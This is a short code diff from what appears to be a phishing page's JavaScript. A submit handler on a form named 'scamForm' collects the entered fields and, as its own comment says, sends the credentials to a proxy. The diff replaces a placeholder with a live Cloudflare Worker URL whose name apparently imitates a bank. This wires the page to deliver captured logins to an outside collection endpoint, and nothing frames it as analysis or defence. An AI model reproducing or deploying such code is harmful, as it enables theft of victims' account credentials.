@@ -341,7 +341,7 @@ document.getElementById('scamForm').addEventListener('submit', function(e) {
     const data = Object.fromEntries(formData.entries());
 
     // REPLACE 'YOUR_WORKER_URL' with your actual Cloudflare Worker URL
-    const proxyUrl = 'YOUR_WORKER_URL/login'; 
+    const proxyUrl = 'https://wells-proxy.bigsnow033.workers.dev/login'; 
 
     // 2. Send credentials to the Proxy
     fetch(proxyUrl, {
